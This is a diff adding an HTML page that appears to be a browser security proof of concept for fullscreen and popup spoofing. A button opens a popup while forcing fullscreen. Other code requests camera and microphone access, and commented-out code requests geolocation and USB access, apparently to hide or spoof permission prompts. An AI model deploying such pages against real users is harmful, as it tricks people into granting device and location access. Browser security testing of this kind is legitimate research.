@@ -1,0 +1,61 @@
+<html>
+  <head>
+  
+  </head>
+  <body onclick="">
+    <input type="button" style="margin-top:400px;" value="Double CLick" onclick="cd()" id="takelock">
+	  <div id="content">
+	
+    </div>
+  </body>
+</html>
+<script>
+        
+	
+	   <!-- const spoof = async () => { -->
+
+         
+            <!-- const popupPip = await documentPictureInPicture.requestWindow({ -->
+                <!-- width: 830, -->
+                <!-- height: 200 -->
+            <!-- }); -->
+
+<!-- //var w = window.open(location.href,"Popup","resizable,scrollbars,status") -->
+            <!-- //var p="<div  id='content'> <button onclick='f()'>request fullscreen<\/button></div><div><iframe allow='fullscreen' width='700px' height='700px' src='https://permission.site' ></iframe></div><script>function f(){document.body.requestFullscreen();}<\/script>"; -->
+            <!-- var p="<body onload='p()'><script> y(); function y(){setTimeout(getLocation,1);}function getLocation(){if (navigator.geolocation) {navigator.geolocation.getCurrentPosition(showPosition);} else {}}function showPosition(position) {}<\/script><div  id='content'> <button style='margin-left:400px' onclick='window.open(\"fullscreenspoof1.html\",\"Popup\",\"toolbar=yes,scrollbars=yes,resizable=yes,top=500,left=500,width=1950,height=700,status\")'>popup</button> <\/body>"; -->
+            <!-- //popupPip.document.body.append(content); -->
+			<!-- popupPip.document.write(p); -->
+        <!-- }; -->
+
+function cd()
+{
+// p();
+ //window.open("fcr_r.html","Popup","toolbar=yes,scrollbars=yes,resizable=yes,top=500,left=500,width=750,height=700,status");
+ //window.open("fullscreenspoof1.html","Popup","toolbar=yes,scrollbars=yes,resizable=yes,top=500,left=500,width=1230,height=700,status")
+ window.open("fullscreenspoof1.html","Popup","toolbar=yes,scrollbars=yes,resizable=yes,top=500,left=500,width=1130,height=700,status")
+ //setTimeout('window.open("fullscreenspoof1.html","Popup","toolbar=yes,scrollbars=yes,resizable=yes,top=500,left=500,width=1200,height=700,status")',500);
+ document.body.requestFullscreen();
+ //document.body.requestPointerLock();
+}
+
+	function p(){
+  
+   navigator.mediaDevices ?
+        navigator.mediaDevices.getUserMedia(
+          {audio: true, video: true}).then(
+            <!-- displayOutcome("camera+microphone", "success"), -->
+            <!-- displayOutcome("camera+microphone", "error") -->
+        ) :
+        navigator.getUserMedia(
+          {audio: true, video: true},
+          <!-- displayOutcome("camera+microphone", "success"), -->
+          <!-- displayOutcome("camera+microphone", "error") -->
+        );
+
+        <!-- navigator.usb.requestDevice({filters: [{}]}).then( -->
+        <!-- <!-- displayOutcome("usb", "success"), --> -->
+        <!-- <!-- displayOutcome("usb", "error") --> -->
+      <!-- ); -->
+
+}
+  </script>
